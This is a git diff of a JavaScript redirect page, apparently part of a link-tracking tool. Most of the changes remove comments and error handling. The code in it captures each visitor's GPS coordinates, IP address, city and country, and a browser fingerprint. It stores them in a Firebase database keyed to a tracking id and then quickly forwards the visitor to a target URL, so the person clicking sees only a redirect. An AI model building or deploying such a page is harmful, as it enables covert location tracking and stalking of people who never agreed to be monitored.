@@ -17,8 +17,7 @@
       projectId: "jarsi-df353",
       storageBucket: "jarsi-df353.appspot.com",
       messagingSenderId: "488797085147",
-      appId: "1:488797085147:web:52108c710556a39f62dbfe",
-      measurementId: "G-J2Y7F4N6VW"
+      appId: "1:488797085147:web:52108c710556a39f62dbfe"
     };
 
     firebase.initializeApp(firebaseConfig);
@@ -29,11 +28,10 @@
     const target = urlParams.get('target');
     const trackingId = urlParams.get('id');
 
-    // Redirect if missing params
     if (!target || !trackingId) {
       window.location.href = 'lacak.html';
     } else {
-      // Create basic tracking data
+      // Create tracking data
       const trackingData = {
         id: trackingId,
         target: target,
@@ -47,7 +45,7 @@
         deviceId: generateDeviceId()
       };
 
-      // Set a timeout for the entire process (max 3 seconds)
+      // Set timeout for redirect (max 3 seconds)
       const redirectTimeout = setTimeout(() => {
         performRedirect(target);
       }, 3000);
@@ -56,41 +54,32 @@
       if ('geolocation' in navigator) {
         navigator.geolocation.getCurrentPosition(
           (position) => {
-            // Success - use high accuracy GPS coordinates
             trackingData.latitude = position.coords.latitude;
             trackingData.longitude = position.coords.longitude;
             trackingData.locationSource = 'geolocation';
             getIPAndSave(trackingData, redirectTimeout, target);
           },
-          (error) => {
-            // Geolocation failed - fallback to IP
+          () => {
             trackingData.locationSource = 'ip-fallback';
             getIPAndSave(trackingData, redirectTimeout, target);
           },
-          { timeout: 1000 } // Don't wait too long for geolocation
+          { timeout: 1000 }
         );
       } else {
-        // No geolocation support - fallback to IP
         trackingData.locationSource = 'ip-fallback';
         getIPAndSave(trackingData, redirectTimeout, target);
       }
     }
 
-    // Helper function to get IP-based location and save data
     function getIPAndSave(trackingData, redirectTimeout, target) {
       fetch('https://ipapi.co/json/')
-        .then(response => {
-          if (!response.ok) throw new Error('IP API response not OK');
-          return response.json();
-        })
+        .then(response => response.json())
         .then(ipData => {
-          // Add IP data to tracking object
           trackingData.ip = ipData.ip || 'Unknown';
           trackingData.city = ipData.city || 'Unknown';
           trackingData.region = ipData.region || 'Unknown';
           trackingData.country = ipData.country_name || 'Unknown';
           
-          // Only set IP coordinates if we don't have geolocation data
           if (!trackingData.latitude) {
             trackingData.latitude = ipData.latitude || 'Unknown';
             trackingData.longitude = ipData.longitude || 'Unknown';
@@ -98,22 +87,15 @@
           
           saveToFirebase(trackingData, redirectTimeout, target);
         })
-        .catch(error => {
-          // Set defaults if IP lookup fails
+        .catch(() => {
           trackingData.ip = 'Unknown';
           trackingData.city = 'Unknown';
           trackingData.region = 'Unknown';
           trackingData.country = 'Unknown';
-          if (!trackingData.latitude) {
-            trackingData.latitude = 'Unknown';
-            trackingData.longitude = 'Unknown';
-          }
-          
           saveToFirebase(trackingData, redirectTimeout, target);
         });
     }
 
-    // Save data to Firebase
     function saveToFirebase(trackingData, redirectTimeout, target) {
       const logRef = database.ref('logs/' + trackingData.id + '_' + Date.now());
       
@@ -122,18 +104,16 @@
           clearTimeout(redirectTimeout);
           performRedirect(target);
         })
-        .catch(error => {
-          console.error('Error saving to Firebase:', error);
+        .catch(() => {
           clearTimeout(redirectTimeout);
           performRedirect(target);
         });
     }
 
-    // Perform the actual redirect
     function performRedirect(targetUrl) {
       let finalUrl = targetUrl;
       
-      // Ensure the URL has a protocol
+      // Add https:// if missing
       if (!/^https?:\/\//i.test(targetUrl)) {
         finalUrl = 'https://' + targetUrl;
       }
@@ -141,7 +121,6 @@
       window.location.href = finalUrl;
     }
 
-    // Generate a simple device fingerprint
     function generateDeviceId() {
       const components = [
         navigator.userAgent,
@@ -152,12 +131,10 @@
       ];
       
       let hash = 0;
-      const str = components.join('|');
-      
-      for (let i = 0; i < str.length; i++) {
-        const char = str.charCodeAt(i);
+      for (let i = 0; i < components.join('|').length; i++) {
+        const char = components.join('|').charCodeAt(i);
         hash = (hash << 5) - hash + char;
-        hash |= 0; // Convert to 32bit integer
+        hash |= 0;
       }
       
       return Math.abs(hash).toString(36).substring(0, 8);
